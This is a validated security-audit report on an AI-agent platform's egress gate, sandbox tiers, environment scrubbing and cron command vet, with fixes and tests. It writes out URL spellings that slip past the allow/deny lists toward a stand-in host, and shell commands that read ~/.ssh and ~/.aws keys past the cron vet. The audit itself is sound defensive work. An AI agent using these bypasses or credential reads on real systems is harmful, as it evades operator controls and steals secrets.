# Kiro Crew validated findings: Security and reliability

Part of the validated findings set; start at [00-index.md](00-index.md). Code verified at commit `397f4be`; sources snapshot 2026-10-07 09:53:08 UTC.

## 3. Security and reliability

### REL-12 [75, default, effort M] Outbox video cards stall the event loop and crash-loop the gateway — CONFIRMED

> **COMPLETED** — covered by open upstream PR #17351 ("cache content-scan verdicts and serialize the scans"; diff verified: `_scan_verdict` cache + serialization with tests); not duplicated.
- **Verified claim:** GET /api/outbox/{filename} (what every outbox audio/video FileCard points its <video preload=metadata>/<audio> at) reads the whole file (<=50 MB cap) and, on every request, runs binary_content_is_flagged (latin-1 decode + full redact_via_context alternation, then wide_content_is_flagged) through asyncio.to_thread. The regex passes hold the GIL inside single C calls, so the to_thread offload does not keep the event loop live: measured on this host, one 50 MB scan = 7.6 s wall with a 4.4 s max loop stall; 4 concurrent = 15.5 s max stall; 8 concurrent = 28.8 s max stall, which exceeds the 25 s default loop-watchdog exit budget (desktop/foreground launches) and would kill the gateway; managed services use 90 s. Nothing caches the verdict, and the route ignores Range, so each browser re-request (metadata + moov seek, re-open after restart) re-scans the full file and re-arms the stall.
- **Evidence (at `397f4be`):**
  - website/src/components/FileCard.tsx:62 — url = `/api/outbox/${encodeURIComponent(file.filename)}`; :82 <video controls preload="metadata" src={url}>; :71 same for <audio>
  - src/kiro_crew/dashboard/handlers/files.py:819 api_outbox_download — _read_outbox_file reads whole file via safe_read_file_bytes; :1007 `if await asyncio.to_thread(binary_content_is_flagged, raw)`; :949 text branch wide_content_is_flagged; response is web.Response(body=raw) (no Range)
  - src/kiro_crew/hooks.py:2114 — MAX_FILE_BYTES = 50 * 1024 * 1024
  - src/kiro_crew/platform/context.py:974 binary_content_is_flagged — `text = raw.decode("latin-1"); if redact_via_context(text) != text: ...; return wide_content_is_flagged(raw)`; docstring: 'CPU work over up to the 50 MB read cap'
  - no verdict cache: rg 'verdict_cache|_flag_cache|scan_cache' finds only session_storage.py's unrelated scan cache
  - src/kiro_crew/config/sections.py:2497-2498 — LOOP_STALL_EXIT_AFTER_DEFAULT = 25, LOOP_STALL_EXIT_AFTER_MANAGED_DEFAULT = 90; dashboard/loop_watchdog.py docstring: SIGALRM fires 'whatever the loop thread is doing (... a long C call holding the GIL)'
  - measured (rel12_scan.py, random 50 MB buffer, M-series macOS, py3.14): single scan 7.6 s; to_thread x1 max loop lag 4.41 s; x4 15.45 s (6 ticks in 30 s); x8 28.77 s (> 25 s budget)
  - src/kiro_crew/dashboard/file_api/transfer.py:324 api_file_stream — the Range-capable media route already exists and probes only the first 64 KiB (_STREAM_TEXT_PROBE_BYTES), documented as an accepted gap
- **Checked by:** ran-new-script (scan input = random.randbytes, not real H.264; latin-1 + redact cost on real video may differ)
- **Required outcome:** Rendering outbox media cards never runs a whole-file credential scan on the gateway's GIL per request; a chat with any number of outbox videos cannot stall the loop past a small bound or trip the loop watchdog, and the credential gate on outbox media keeps its current coverage.
- **Solution:**
  1. Cache the outbox scan verdict per file identity: key (resolved path, st_dev, st_ino, st_size, st_mtime_ns) -> flagged bool, filled once (at POST /api/outbox/notify, files.py:541, which already scans at ingest, or on first download) and re-checked only when the identity changes; api_outbox_download (files.py:819) consults it before calling binary_content_is_flagged/wide_content_is_flagged.
  2. Serialize the remaining cold scans behind one bounded worker (a single-slot semaphore or a dedicated process pool) so N cards cannot multiply GIL hold; a process pool is the only option that removes the GIL hold itself.
  3. Optionally move FileCard media (FileCard.tsx:62/:71/:82) onto a Range-capable outbox route so seeks do not re-read 50 MB; do NOT simply repoint at /api/file-stream, whose 64 KiB probe is weaker than the outbox full-file gate — that would be a take-away change and needs a Reader: entry per docs/system-specs/common/take-away-changes.md.
  4. Update docs/system-specs/modules/artifacts.md / the files handler spec in the same commit.
- **Done when:** A test drives api_outbox_download twice for the same unchanged outbox file with binary_content_is_flagged monkeypatched to a call counter and asserts it ran exactly once; a second test changes the file's mtime/size and asserts the scan re-runs; a third asserts N concurrent first requests run at most one scan at a time (counter of simultaneous entries, released via an Event, no sleeps).
- **Upstream:** #17304 PR #17351 (state unverified)
- **Changed from the source claim:** Mechanism confirmed and measured; the crash needs the max loop stall to exceed the exit budget: 25 s default (desktop/foreground) vs 90 s managed service. On this fast host that took ~8 concurrent 50 MB scans (4 gave 15.5 s); the reporter's ~19 s per video implies fewer on slower hosts. Also adds: route has no Range support and no verdict cache, so every re-request re-scans.
- **Second reader:** top-20 check: agreed.
- **Sources:** verify_needed:G9(#17304), verification_needed:Part3(#17304), verify_needed:G36, verify_needed:G43

### SEC-1 [70, armed, effort M] Egress allow-list bypass via backslash before @ — CONFIRMED

> **COMPLETED** — fixed on `main` in `c906d25` (`fix/egress-host-parsing`): the egress gate now derives special-scheme hosts the WHATWG way (backslash fold, slash-ignore, percent-decode, IDNA, IPv4 canonical form, one trailing dot stripped) and emits a never-permittable marker for underivable hosts; governance.md updated in-commit.
- **Verified claim:** governance._url_host parses with urllib.parse.urlparse and takes the text after the LAST '@' of the netloc, so `https://evil.com\@good.com/` (and `https://evil.com\\@good.com/`) is classified as host `good.com`. A WHATWG parser (node `new URL`, the same standard the Rust `url` crate follows) treats `\` as `/` for special schemes and resolves host `evil.com`. The bypass holds in BOTH ruleset modes: allow:[good.com] PERMITs it, and deny:[evil.com] also PERMITs it. Measured through the real gate_decision. Not checked here: whether kiro-cli's fetch tool sends the URL unchanged and connects to evil.com, because kiro-cli is not installed. node's WHATWG parse stands in for it.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/platform/governance.py:740 — `parsed = urlparse(s)`
  - src/kiro_crew/platform/governance.py:762 — `host = netloc.rsplit("@", 1)[-1]`
  - src/kiro_crew/platform/governance.py:667-671 — fetch kind: `host = _url_host(url)` -> `("network.egress", host)`
  - src/kiro_crew/platform/governance.py:4073-4091 gate_decision — args pairs resolved; any deny denies
  - ran: _url_host('https://evil.com\\@good.com/') = 'good.com'; node new URL(...).hostname = 'evil.com'
  - ran: gate_decision(allow:[good.com], fetch, url=https://evil.com\@good.com/) -> PERMIT (rule2-intersect)
  - ran: gate_decision(deny:[evil.com,*.evil.com], same url) -> PERMIT; control https://good.com@evil.com/ -> deny in both modes
  - same subject mismatch, measured (not in the source claim): `https://evil%2Ecom/`, `https://evil。com/`, `https://evil.com\.good.com/` all PERMIT under deny:[evil.com] while WHATWG resolves evil.com; `http://0x7f.1/` PERMITs under deny:[127.0.0.1] (WHATWG host 127.0.0.1)
  - …and 3 more in the verification results.
- **Checked by:** ran-new-script
- **Required outcome:** The egress gate decides on the host that a WHATWG URL parser (the parser the fetching client uses) would connect to, in both allow and deny modes. Hosts are compared after the same normalisation the client applies (lowercase, IDNA mapping, percent-decoding, IPv4 canonical form, trailing dot stripped for comparison). A network-scheme URL with no derivable host is denied under an allow-mode network.egress ceiling; under a targeted deny-mode ceiling the documented marker semantics hold (governance.py:615-620), so deny lists bind through the corrected host derivation, not through a new refusal the operator's deny list did not name. The decision follows from getting the subject right, not from adding more string patterns.
- **Solution:**
  1. In platform/governance.py replace the network-scheme branch of _url_host (715-765) with a WHATWG-equivalent host derivation. For special schemes (http/https/ws/wss/ftp), first map `\` to `/`, then treat `scheme:host`, `scheme:/host` and `scheme://host` alike (the WHATWG 'special authority ignore slashes' state), then take userinfo/port off the authority.
  2. Normalise the extracted host: percent-decode, IDNA-map with UTS46 (stdlib `encodings.idna` is IDNA2003; it is close enough for a deny comparison only if a vetted WHATWG-compatible helper is not available, so check what is already vendored), canonicalise IPv4 numeric forms (`0x7f.1` -> `127.0.0.1`), lowercase, and strip one trailing dot.
  3. Keep the scheme-less and `host:port` behaviour that test_governance_chokepoints.py:1391-1418 pins (`example.com/path`, `example.com:8080/path`, `//cdn.example.com/a`, `file:///...` -> '').
  4. Return a distinct 'unclassifiable' result for a network-scheme URL with no derivable host. Have classify_tool_args (650-654, 667-671, 675-678) emit a never-permittable marker modelled on _TRUNCATED_SCAN_ITEM (503) for it. Note that a targeted deny-mode ceiling permits such a marker (docstring 615-620), so this marker covers only genuinely unparseable input; the WHATWG normalisation in steps 1-2 is what closes deny mode.
  5. Update the _url_host caller at governance.py:920 (dead-pattern detection) for any return-type change.
  6. Update governance.md 'Filesystem + egress at the host gate' (2048-2112) in the same commit. Grouped with SEC-2/SEC-3 in one PR per FIX_PLAN.
- **Done when:** A table-driven unit test over (url, expected_host) pairs, with no node or network dependency, asserts _url_host / classify_tool_args results: `https://evil.com\@good.com/` -> evil.com, `https://evil.com\\@good.com/` -> evil.com, `https://good.com@evil.com/` -> evil.com, `https://evil%2Ecom/` -> evil.com, `https://evil。com/` -> evil.com, `http://0x7f.1/` -> 127.0.0.1, `https://good.com/x` -> good.com, plus the existing scheme-less cases unchanged. A gate_decision test asserts allow:[good.com] denies the first two and deny:[evil.com] denies them too, while `https://good.com/x` stays permitted under allow:[good.com].
- **Changed from the source claim:** Severity 80 -> 70: armed only (needs an operator network.egress ceiling); the scope governs only fetch-kind tools (governance.md:2323); the kiro-cli connect half is unverified. Claim widened: the bypass also defeats deny-mode lists, and the same subject mismatch covers percent-encoded, IDNA full-stop and numeric-IPv4 hosts. Line numbers at HEAD: _url_host 715-765, urlparse 740, rsplit('@') 762.
- **Second reader:** top-20 check: corrected. required_outcome says a host-less network URL is 'denied under ANY governed network.egress ceiling', but the solution's own step 4 (and governance.py:615-620) says a targeted deny-mode ceiling permits the marker. The outcome as written cannot be met by the solution and would tighten an operator's deny-list ceiling past what it names; claim, evidence and severity hold (re-ran sec1_3_egress.py at 397f4be: identical table). security-rules check: corrected. required_outcome says a host-less network URL is 'denied under ANY governed network.egress ceiling', but the solution's own step 4 (and governance.py:615-620) says a targeted deny-mode ceiling permits the marker. The outcome as written cannot be met by the solution and would tighten an operator's deny-list ceiling past what it names; claim, evidence and severity hold (re-ran sec1_3_egress.py at 397f4be: identical table).
- **Sources:** FIX_PLAN:SEC-1, REVIEW_FINDINGS:Part1#1, verify_needed:A5, verify_needed:X7, FIX_PLAN-old:S1-S3

### SEC-2 [65, armed, effort S] Scheme-only URLs (https:evil.com, http:/evil.com) skip the egress check — CONFIRMED

> **COMPLETED** — fixed with SEC-1 in `c906d25`: scheme-only spellings now resolve their host, so deny lists bind through the corrected derivation.
- **Verified claim:** For `https:evil.com`, `http:/evil.com` and `https:/evil.com/x`, _url_host returns '' because the no-`://` branch only recovers a host when the first path segment is a numeric port. classify_tool_args then emits no network.egress pair, for fetch kind and for the kindless shape fallback alike. gate_decision returns PERMIT under both allow:[good.com] and deny:[evil.com]. WHATWG (node `new URL`) resolves host `evil.com` for all three. Fail-open on a governed egress ceiling. Not checked here: whether kiro-cli's fetch tool actually fetches these spellings.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/platform/governance.py:750-758 — `host_port_form = first_seg.isdigit() and _looks_like_host(scheme)`; otherwise netloc=''
  - src/kiro_crew/platform/governance.py:667-671 / 675-678 / 650-654 — `if host:` guards every egress append, so '' emits nothing
  - src/kiro_crew/platform/governance.py:4079-4080 — `if not pairs: return Decision(True, ...)`; title pairs for web_fetch are only commands/tools
  - ran: classify_tool_args('fetch', {'url': 'https:evil.com'}) = (); classify_tool_args('', {'url': 'https:evil.com'}) = ()
  - ran: gate_decision(allow:[good.com]) PERMIT and gate_decision(deny:[evil.com]) PERMIT for https:evil.com, http:/evil.com, https:/evil.com/x; node hostname = evil.com for each
  - src/kiro_crew/platform/governance.py:615-620 — a targeted deny-mode ceiling PERMITS a never-permittable marker item, so a sentinel alone does not close deny mode
- **Checked by:** ran-new-script
- **Required outcome:** A special-scheme URL written without `//` is classified to the host a WHATWG parser resolves (`https:evil.com` -> evil.com), so allow-mode and deny-mode ceilings both bind on it. Only a network-scheme URL with no derivable host falls back to a deny marker.
- **Solution:**
  1. Ship in the same PR as SEC-1.
  2. In _url_host (platform/governance.py:715-765), for a scheme in _NETWORK_SCHEMES, rebuild the URL as `scheme://` + rest with the leading `/` or `\` characters stripped before parsing, matching WHATWG's special-authority-ignore-slashes state. Do NOT return a sentinel for this shape: FIX_PLAN's 'require // else sentinel' only closes allow mode, because a targeted deny-mode ceiling permits a marker item (governance.py:615-620).
  3. Keep the `host:port` recovery (`example.com:8080`) and the non-network-scheme '' result (`mailto:`, `tel:80`) that test_governance_chokepoints.py:1391-1433 pins.
  4. For a network scheme whose host is still empty after step 2, emit a marker like _TRUNCATED_SCAN_ITEM (governance.py:503) from classify_tool_args at 650-654, 667-671 and 675-678, so an allow-mode ceiling denies it.
- **Done when:** Unit tests: classify_tool_args('fetch', {'url': u}) == (('network.egress','evil.com'),) for u in `https:evil.com`, `http:/evil.com`, `https:/evil.com/x`, and the same for kind ''. gate_decision denies all three under allow:[good.com] AND under deny:[evil.com]. `mailto:exfil@allowed.com` still returns () (test at :1433) and `example.com:8080/path` still yields example.com.
- **Changed from the source claim:** Severity 75 -> 65 (armed; fetch-tool-only scope; client half unverified). Solution corrected: FIX_PLAN's 'require // else sentinel + deny marker' does not close deny mode, because a deny-mode ceiling permits the marker (governance.py:615-620). The host must be recovered the WHATWG way. Line numbers unchanged at HEAD (750-758, 650-654, 668-671, 675-678).
- **Second reader:** top-20 check: agreed. security-rules check: agreed.
- **Sources:** FIX_PLAN:SEC-2, REVIEW_FINDINGS:Part1#2, verify_needed:A5, verify_needed:X7, FIX_PLAN-old:S1-S3

### SEC-5 [55, default, effort S] Standard sandbox tier leaves ~/.aws, ~/.ssh, ~/.kube readable to spawned shells — CONFIRMED

> **COMPLETED (doc part)** — `4740ae1` (`docs/standard-tier-readable-stores`): the tier table and sandbox docstring now name all seven readable stores (incl. `.config/gh`, `.npmrc`, `.netrc`, `.git-credentials`); no mask changed — the tier's reach is the operator's to widen (options a–d remain theirs).
- **Verified claim:** Measured with the real sandbox (macOS Seatbelt, throwaway HOME). At the default tier (`agent.sandbox: auto` -> standard), a child spawned through sandbox.wrap_argv can open() and read ~/.aws/credentials, ~/.ssh/id_ed25519 and ~/.kube/config. It can also read four stores the claim and the security.md tier table do not list: ~/.config/gh/hosts.yml (the gh CLI token), ~/.npmrc, ~/.netrc and ~/.git-credentials. ~/.gnupg, ~/.docker, ~/.azure and ~/.config/gcloud are blocked. At `strict`, all eleven seeded stores are blocked. This is the documented, deliberate standard-tier trade-off (git-over-SSH, credential_process, kubectl), and the file tools still refuse these paths through is_sensitive_path. A shell or interpreter the agent spawns is fenced only by the tier.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/sandbox.py:6-12 — standard 'DELIBERATELY leaves ~/.aws, ~/.ssh and ~/.kube visible ... a spawned shell's open() is not fenced at this tier'
  - src/kiro_crew/sandbox.py:4565-4598 _STRICT_DIRS (adds .aws, .config/gh, .kube) vs :4600-4622 _STANDARD_DIRS (no .aws/.ssh/.kube/.config/gh)
  - src/kiro_crew/sandbox.py:5799-5808 _CC_FILES (.npmrc, .pypirc, .netrc, .git-credentials, .env) — not masked at standard per the run
  - src/kiro_crew/sandbox_launcher_program.py:1640-1641 mask_ssh_keys — 'Strict tier: hide ~/.ssh'
  - ran (darwin, sandbox-exec): mode=auto -> READ: .aws/credentials, .ssh/id_ed25519, .kube/config, .config/gh/hosts.yml, .npmrc, .netrc, .git-credentials; BLOCKED: .gnupg, .docker, .azure, .config/gcloud
  - ran: mode=strict -> all 11 BLOCKED
  - docs/system-specs/modules/security.md:682-685 — tier table lists Accessible `.aws`, `.ssh`, `.kube` only (omits .config/gh, .npmrc, .netrc, .git-credentials)
  - docs/system-specs/modules/security.md:753 'Why standard is a deliberate trade-off'; threat-model row 'XPIA credential theft'
- **Checked by:** ran-new-script
- **Required outcome:** DECISION NEEDED (operator / security owner, not the fixer). AGENTS.md: the sandbox's scope is the operator's to widen, never ours, so no mask or seal is added under this item. The factual work that IS in scope: the documented standard-tier exposure matches what the tier actually leaves readable, and the operator can see it before relying on the default. Options for the owner: (a) keep standard as the default and document the full visible set; (b) surface the visible credential stores in `kirocrew doctor` and setup with a pointer to `agent.sandbox: strict`; (c) make strict the default for unattended runs (a take-away change needing a docs/decisions entry); (d) broker AWS/SSH via credential_process/agent forwarding so strict stays usable.
- **Solution:**
  1. No change to sandbox.py masks under this item.
  2. Correct the tier table in docs/system-specs/modules/security.md (682-685) and the sandbox.py module docstring (6-12) so standard's 'Accessible' column lists .config/gh, .npmrc, .netrc and .git-credentials alongside .aws/.ssh/.kube. That is a doc-accuracy fix in the same commit as nothing else.
  3. Raise options (a)-(d) with the security owner. If they choose a default change, it goes through docs/system-specs/common/take-away-changes.md and a new docs/decisions entry.
- **Done when:** For the doc fix, a test that derives the standard-tier visible set from _STANDARD_DIRS/_STRICT_DIRS/_CC_FILES (the plan, not a live spawn) and asserts the security.md table row names every strict-only credential leaf. For the decision, a recorded docs/decisions entry.
- **Changed from the source claim:** Verified directly (the source was [VERIFY]). Widened: the gh token, .npmrc, .netrc and .git-credentials are also readable at standard, and the security.md tier table omits them. Severity assigned 55 (default config; requires a prompt-injected or misbehaving agent to run a reading shell command; strict exists and the trade-off is documented). Outcome reframed from 'make strict default / broker creds' to an owner decision per the AGENTS.md sandbox-scope rule.
- **Second reader:** top-20 check: agreed. security-rules check: agreed.
- **Sources:** verification_needed:V-1

### SEC-3 [50, armed, effort S] Trailing-dot hostname bypasses egress deny list — CONFIRMED

> **COMPLETED** — fixed with SEC-1 in `c906d25`: one trailing dot stripped from the extracted host; a trailing-dot host-matcher entry now warns as dead like the other dead shapes.
- **Verified claim:** _match_host compares `item.strip().casefold()` against the pattern with fnmatch and strips no trailing dot. `https://evil.com./` gives item `evil.com.`, and `sub.evil.com.` matches neither `evil.com` nor `*.evil.com`. A deny list [evil.com, *.evil.com] therefore PERMITs both. DNS resolves `evil.com.` to the same name, and WHATWG keeps the dot (`evil.com.`), so the client still connects there. In allow mode the same mismatch only causes a false denial (`good.com.` is refused), which fails closed.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/platform/governance.py:239-241 — `return fnmatch.fnmatch(item.strip().casefold(), pattern.strip().casefold())`
  - src/kiro_crew/platform/governance.py:765 — host returned as written (no rstrip('.'))
  - ran: _match_host('evil.com.', 'evil.com') = False; _match_host('sub.evil.com.', '*.evil.com') = False
  - ran: gate_decision(deny:[evil.com,*.evil.com]) PERMIT for https://evil.com./ and https://sub.evil.com./; allow:[good.com] denies them
- **Checked by:** ran-new-script
- **Required outcome:** Host comparison treats a fully-qualified name with a trailing dot as the same name, so deny-mode lists bind on `evil.com.` and `sub.evil.com.`. The normalisation is applied to the subject host (one place, alongside SEC-1's WHATWG normalisation), not by adding pattern variants.
- **Solution:**
  1. Part of the SEC-1..3 PR.
  2. Strip one trailing '.' from the host after the SEC-1 normalisation in _url_host (governance.py:715-765), or at the top of _match_host (239-241) for the item only, never for the pattern.
  3. Check the dead-pattern warning logic around governance.py:900-930 still classifies patterns the same way.
  4. Document it in governance.md's host-matcher paragraph (2064-2091).
- **Done when:** Unit test: with deny:[evil.com, *.evil.com], gate_decision denies fetch of `https://evil.com./` and `https://sub.evil.com./`. With allow:[good.com], `https://good.com./` is permitted and `https://good.com/x` stays permitted.
- **Changed from the source claim:** Severity 55 -> 50 (armed, deny-mode only; allow mode fails closed). Line numbers unchanged at HEAD.
- **Second reader:** security-rules check: agreed.
- **Sources:** FIX_PLAN:SEC-3, REVIEW_FINDINGS:Part1#3, verify_needed:A5, verify_needed:X7, FIX_PLAN-old:S1-S3

### REL-13 [45, default, effort M] Identity sweep spares live-account parents; others' running subagents are still killed — PARTLY

> **COMPLETED** — fixed on `main` in `34da2f3` (`fix/identity-sweep-live-children-busy`): a parent with RUNNING/QUEUED children is busy for the sweep (the same `_snapshot_parent_children` selection the teardown would cancel through), flagged `retire_on_identity_change` and skipped — never retired-and-cancelled; `spawned_under` not widened (the item's own recommendation); the optional empty-fingerprint variant not taken. session.md + subagent.md updated in-commit.
- **Original claim:** Identity-change sweep force-kills running subagents (corrected below)
- **Verified claim:** At HEAD the sweep spares any session whose spawn-identity stamp provably equals the live fingerprint (spawned_under), and spared sessions are neither retired nor counted against completeness — the in-code comment describes exactly the #17360 failure as the reason. The residual defect: a parent that is idle by the semaphore test but whose provider is unstamped or stamped under a different account is still retired, and its running/queued subagents are cancelled (_snapshot_parent_children -> _cancel_parent_children) mid-prompt; there is still no 'has running children' predicate. When the live fingerprint is empty (identity store unreadable/relocated/signed out) nothing is spared, the sweep stays incomplete, and every subsequent turn re-sweeps and kills idle parents' running children again. A busy old-account session also keeps the sweep incomplete, so it re-runs each turn until that session's next acquire retires it.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/session_lifecycle.py:1958 retire_kiro_identity_sessions — loop: `if spawned_under(sess.provider, fingerprint): continue` then `if sess.semaphore.locked(): sess.retire_on_identity_change = True; ...; skipped = True; continue`; otherwise retired and `teardown_children_by_key[key] = self…
  - src/kiro_crew/session_lifecycle.py:2096 — after provider.shutdown(): `await self._cancel_parent_children(key, children, verb="retire_kiro_identity_sessions")` then release_subagent_runtime(key)
  - src/kiro_crew/session_lifecycle.py comment in the loop: 'a parent that ended its turn with spawn_run children still running IS idle by the semaphore test, so its retirement cancelled them ("provider shutdown") on every turn any chat took' — the spare is the stated mitigation
  - src/kiro_crew/kiro_prerequisite.py:1506 spawned_under — `if not live: return False`; unstamped holder `return False` ('An unstamped child is never spared ... an unreadable store (empty live) spares nothing')
  - src/kiro_crew/dashboard/chat_runner.py:3058 — every turn: `retired, complete = await sessions.retire_kiro_identity_sessions(fingerprint=live)` while changed or a pending fingerprint remains; comment: 'Leaving it unreconciled means each turn re-sweeps'
- **Checked by:** read
- **Required outcome:** An identity-change sweep never cancels a running or queued subagent as a side effect of retiring its idle parent; such a parent is treated like a busy session (flagged, retired at its next acquire after its children end), and a sweep that cannot finish because of it does not re-kill work on every turn.
- **Solution:**
  1. Read docs/system-specs/modules/runtime-ownership.md and session.md first (this is a kill path). 1. In retire_kiro_identity_sessions (session_lifecycle.py:2037), before retiring an unlocked session, compute `children = self._snapshot_parent_children(key)`; if any child run is RUNNING or QUEUED, treat it as busy: set `sess.retire_on_identity_change = True`, append to invalidated_keys, `skipped = True`, `continue` (same branch as semaphore.locked()). 2. Do NOT widen spawned_under — the comment pins that a wrong spare keeps a wrong-account child answering turns. 3. Optionally, when live is empty, skip retiring parents with live children rather than the fail-safe retire-everything, or retire them only after the children finish. 4. Update session.md / subagent.md to state that a parent with live children is busy for the identity sweep, in the same commit.
- **Done when:** Unit test: a SessionManager with one kiro-backed session whose semaphore is unlocked, provider unstamped, and _snapshot_parent_children returning one RUNNING agent id; call retire_kiro_identity_sessions(fingerprint='fp-new') and assert the child-teardown handler was never called, the session is still registered with retire_on_identity_change True, and the returned complete is False. A second test with no live children asserts the existing retire path still runs.
- **Upstream:** #17360 (state unverified)
- **Changed from the source claim:** Source claim predates the spawned_under spare now at HEAD (no commit history in this depth-1 clone): parents provably on the live account are no longer killed and no longer block completeness. Residual narrowed to unstamped / other-account parents and the empty-fingerprint case; the missing 'running children = busy' predicate is still absent.
- **Sources:** verify_needed:G11(#17360), verification_needed:Part3(#17360), verify_needed:G43

### SEC-6 [45, default, effort M] Third-party env tokens not scrubbed from agent subprocesses — CONFIRMED

> **COMPLETED (doc part)** — `3b23fb1` (`docs/env-scrub-blast-radius`): the surviving third-party token names are stated in security.md (names only); the inherit-all default stands — scrubbing more is an operator decision, not taken.
- **Verified claim:** The agent-child environment scrub (scrub_agent_subprocess_env, applied parent-side in acp/client.py and acp/runtime.py) drops only names starting with AWS_SECRET, AWS_SESSION, SSH_AUTH_SOCK, GNUPGHOME or GIT_ASKPASS, the Crew-owned channel/integration tokens in _AGENT_DENIED_ENV_KEYS, and the PYTHON* prefixes. Measured: GITHUB_TOKEN, GH_TOKEN, OPENAI_API_KEY, NPM_TOKEN, HF_TOKEN, GOOGLE_API_KEY, DATABASE_URL, AWS_ACCESS_KEY_ID and AWS_PROFILE all survive into the child. ANTHROPIC_* and CLAUDE_CODE_* survive by the documented env-passthrough contract. AWS_ACCESS is added only to the MCP gateway-daemon scrub (mcp_gateway/manager.py), not the agent's. AWS_ACCESS_KEY_ID alone is an identifier, since its secret is scrubbed. Exposure depends on how the gateway was launched: a shell-launched gateway inherits the user's exports, while service units bake a limited environment.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/sandbox.py:5825-5831 `_SENSITIVE_ENV_PREFIXES = ["AWS_SECRET", "AWS_SESSION", "SSH_AUTH_SOCK", "GNUPGHOME", "GIT_ASKPASS"]`
  - src/kiro_crew/sandbox.py:5878-5913 _AGENT_DENIED_ENV_KEYS — Slack/Telegram/Discord/Jira/... Crew-owned tokens only
  - src/kiro_crew/sandbox.py:10819 `_SPAWN_SCRUB_ENV_PREFIXES = list(_SENSITIVE_ENV_PREFIXES) + list(_AGENT_DENIED_ENV_KEYS)`; :10892-10920 scrub_agent_subprocess_env
  - src/kiro_crew/acp/client.py:8769 and src/kiro_crew/acp/runtime.py:2230 — `env = scrub_agent_subprocess_env(env, forward_ssh_auth_sock=...)`
  - src/kiro_crew/mcp_gateway/manager.py:168-171 — `AWS_ACCESS` added for the gateway daemon only
  - src/kiro_crew/sandbox.py:5816-5823 — ANTHROPIC_*/CLAUDE_CODE_* deliberately pass through
  - ran: scrub_agent_subprocess_env keeps ANTHROPIC_API_KEY, AWS_ACCESS_KEY_ID, AWS_PROFILE, CLAUDE_CODE_OAUTH_TOKEN, DATABASE_URL, GH_TOKEN, GITHUB_TOKEN, GOOGLE_API_KEY, HF_TOKEN, NPM_TOKEN, OPENAI_API_KEY; drops AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN, SLACK_BOT_TOKEN, SSH_AUTH_SOCK
  - ran: macOS wrap_argv at standard tier `env -u`s only _SENSITIVE_ENV_PREFIXES (sandbox.py:8471-8473 adds _AGENT_DENIED_ENV_KEYS only for cc/strict), so the parent-side scrub is what removes Crew tokens on the agent path
- **Checked by:** ran-new-script
- **Required outcome:** DECISION NEEDED (operator / security owner). Scrubbing more of the operator's own environment from their agent is a scope change, and agents may rely on GITHUB_TOKEN, NPM_TOKEN etc. (gh, npm publish), so it is not the fixer's call. Options: (a) keep the inherit-all default and document the blast radius in security.md and `kirocrew doctor` (names only, never values); (b) add an operator-configured deny-glob list, empty by default, applied in scrub_agent_subprocess_env; (c) a default deny-glob (*_TOKEN, *_API_KEY, *_SECRET*) with an operator allowlist, which is a take-away change needing a decisions entry. The ANTHROPIC_*/CLAUDE_CODE_* passthrough contract must be preserved under any option.
- **Solution:**
  1. No change to the scrub lists under this item without an owner decision.
  2. If (b) or (c) is chosen: add the config key (an agent.* field, read in the off-loop env-prep hop like forward_ssh_auth_sock), apply it inside scrub_agent_subprocess_env (sandbox.py:10892) so every agent spawn path (acp/client.py:5110/5205/5342/8769, acp/runtime.py:2230, knowledge/llm_pool.py:789, dashboard handlers) inherits it, and update agent_env_scrub_prefixes() (10844) so the deepseek_env validator stays consistent.
  3. Update security.md's env-scrub row (tier table 682-685) in the same commit.
  4. Whatever is chosen, document that AWS_ACCESS is scrubbed for the gateway daemon but not the agent.
- **Done when:** For (b)/(c): a unit test feeding scrub_agent_subprocess_env an env with GITHUB_TOKEN and a configured glob asserts it is dropped, that ANTHROPIC_API_KEY and CLAUDE_CODE_* survive, and that agent_env_scrub_prefixes() reports the glob. For (a): a doctor test asserting the inherited credential-shaped variable NAMES are listed and their values never are.
- **Changed from the source claim:** Verified directly. The claim's example AWS_ACCESS_KEY_ID is correct for the agent path (only the gateway daemon adds AWS_ACCESS), but it is an identifier without its scrubbed secret. Severity assigned 45 (default; needs the token exported in the gateway's launch environment). Outcome reframed as an owner decision. Line numbers: _SENSITIVE_ENV_PREFIXES at 5825-5831 (source cited 5815-5830).
- **Second reader:** security-rules check: agreed.
- **Sources:** verification_needed:V-2

### SEC-12 [45, armed, effort M] Cron vet leading-dot rule broken by bash dotglob — CONFIRMED

> **COMPLETED (doc part)** — `15feae0` (`docs/cron-vet-accident-rail`): the false "primary control" claim corrected in cron_script.py (the vet is an accident rail; the sandbox tier fences ~/.ssh); learn-cron-dashboard.md carries no matching claim at HEAD. Delegated decision taken: (b) parity with the agent's own standard tier — flipping to (a) strict remains an owner opt-in.
- **Verified claim:** Demonstrated, and broader than dotglob. Cron shell commands run through cron_script.run_command_sandboxed under wrap_argv(mode="cc"), which deliberately leaves ~/.ssh readable. The code comment names the storage-time text vet (mcp_cron._vet_shell_command) as 'the primary control' for that exposure. In a throwaway HOME with ~/.ssh/id_rsa, the vet DENIES `cat ~/.ssh/id_rsa` and `cat ~/.s?h/id_rsa`. It PASSES, and the cc-sandboxed runner then prints the private key for, all of: `bash -O dotglob -c 'cat ~/*/id_rsa'`, `bash -c 'shopt -s dotglob; cat ~/*/id_rsa'`, `bash -c 'GLOBIGNORE=x; cat ~/*/id_rsa'`, `find ~ -name id_rsa -exec cat {} +`, and a python3 -c that builds '.ssh' at run time. The leading-dot rule at mcp_cron.py:984 is one instance; the underlying defect is that a text matcher is carrying a path fence, which AGENTS.md says it cannot. Note: the subject here IS a shell command line, not a script body, so the cron-script-body invariant is not engaged. cron_add is not in the default agent's allowedTools, so under `ask` mode the operator sees the command before it is stored. Negative control on this host (macOS, sandbox-exec): the cron runner's cc wrap IS active. `bash -O dotglob -c 'cat ~/*/config.json'` and `... ~/*/secring` (passes the vet) cannot read the seeded ~/.docker or ~/.gnupg, so the ~/.ssh read is the cc tier's deliberate visibility, not a missing sandbox. Also measured on macOS: `bash -O dotglob -c 'cat ~/*/credentials'` passes the vet and READS ~/.aws/credentials, because Seatbelt's declared cc capability gap (sandbox_plan.CAPABILITIES: cc_unmaskable_dirs={'.aws'}) leaves ~/.aws readable at cc. On macOS the text vet is therefore the only fence for ~/.aws in cron commands as well. On Linux the cc tier masks ~/.aws.
